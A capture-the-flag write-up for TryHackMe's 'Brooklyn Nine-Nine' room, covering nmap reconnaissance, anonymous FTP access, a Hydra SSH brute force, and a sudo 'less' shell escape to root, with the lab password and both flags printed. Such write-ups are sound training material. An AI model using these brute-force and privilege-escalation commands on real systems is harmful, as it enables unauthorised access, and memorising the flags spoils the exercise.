# Brooklyn Nine-Nine — TryHackMe

**Date:** May 2026  
**Difficulty:** Easy  
**Category:** FTP, SSH, Privilege Escalation  
**Status:** ✅ Completed  

---

# 🔍 Summary

Brooklyn Nine-Nine is an easy TryHackMe room focused on service enumeration, credential attacks, and Linux privilege escalation.  
The objective was to enumerate available services, obtain user credentials through FTP and brute force attacks, gain SSH access, and escalate privileges using misconfigured sudo permissions.

---

# 🛠️ Tools Used

- Nmap
- FTP
- Hydra
- SSH
- GTFOBins

---

# 📡 Reconnaissance

## Nmap Scan

```bash
nmap -sS -A -T4 MACHINE_IP
```

<img width="1126" height="1180" alt="Screenshot 2026-05-25 155718" src="https://github.com/user-attachments/assets/7bcf452b-091c-4ce7-bcd4-090be57fc650" />


### Findings

The scan revealed the following open services:

| Port | Service |
|------|---------|
| 21 | FTP |
| 22 | SSH |
| 80 | HTTP |

Important finding:
- Anonymous FTP login enabled

---

## Website Enumeration

Browsing to the website displayed a Brooklyn Nine-Nine themed homepage.

<img width="2556" height="1318" alt="Screenshot 2026-05-25 155821" src="https://github.com/user-attachments/assets/ac91f8ae-c31c-4d54-b161-20398f518469" />

No useful information was immediately visible on the webpage.

---

# 🔎 FTP Enumeration

## Anonymous FTP Access

I connected to the FTP server using anonymous login:

```bash
ftp MACHINE_IP
```

<img width="872" height="390" alt="Screenshot 2026-05-25 160437" src="https://github.com/user-attachments/assets/26797ffa-6bae-4361-8975-5e00aff71b04" />


Inside the FTP share, I found:

```text
note_to_jake.txt
```

Contents:

```text
From Amy,

Jake please change your password. It is too weak and Holt will be mad if someone hacks into the nine nine
```

This suggested that Jake had weak SSH credentials.

---

# 🔓 Exploitation

## SSH Brute Force

I used Hydra against the SSH service targeting user `jake`.

```bash
hydra -l jake -P /usr/share/wordlists/rockyou.txt ssh://MACHINE_IP
```

<img width="1684" height="524" alt="Screenshot 2026-05-25 160727" src="https://github.com/user-attachments/assets/e721478c-eeff-40ee-8fac-abf1feea2408" />


### Credentials Found

```text
Username: jake
Password: 987654321
```

---

## SSH Login

Using the discovered credentials:

```bash
ssh jake@MACHINE_IP
```

After logging in, I confirmed access as user `jake`.

---

# 🚩 User Flag

I enumerated the `/home` directory and discovered another user named `holt`.

Navigating to Holt’s home directory:

```bash
cd /home/holt
ls
```

I discovered:

```text
user.txt
```

Reading the file:

```bash
more user.txt
```

<img width="555" height="439" alt="Screenshot 2026-05-25 160910" src="https://github.com/user-attachments/assets/35edfc08-7436-4b41-afd8-241527aac35a" />


### User Flag

```text
ee11cbb19052e40b07aac0ca060c23ee
```

---

# ⬆️ Privilege Escalation

## GTFOBins Research

I checked sudo permissions:

```bash
sudo -l
```

The output revealed that `jake` could run:

```text
/usr/bin/less
```

as root without a password.

I searched GTFOBins for privilege escalation techniques involving `less`.

<img width="2559" height="908" alt="Screenshot 2026-05-25 161205" src="https://github.com/user-attachments/assets/df3ab734-1922-4dd4-8de9-7616b31b6bf8" />


GTFOBins suggested:

```bash
sudo less /etc/hosts
!/bin/sh
```

---

## Root Shell

Executing the command:

```bash
sudo less /etc/hosts
```

Then entering:

```bash
!/bin/sh
```

spawned a root shell.

<img width="968" height="331" alt="Screenshot 2026-05-25 161658" src="https://github.com/user-attachments/assets/06c7642e-ff24-493e-b560-4b487c697d01" />


---

# 🚩 Root Flag

After gaining root access:

```bash
cd /root
ls
more root.txt
```

### Root Flag

```text
63a9f0ea7bb98050796b649e85481845
```

---
<img width="1541" height="736" alt="Screenshot 2026-05-25 161713" src="https://github.com/user-attachments/assets/1aacb292-120a-4c31-a333-f53e71adcd82" />

# 📚 Lessons Learned

- Practiced FTP enumeration techniques
- Learned how anonymous FTP access can expose sensitive information
- Used Hydra for SSH brute force attacks
- Practiced Linux user enumeration
- Learned privilege escalation through misconfigured sudo permissions
- Used GTFOBins for privilege escalation research

---

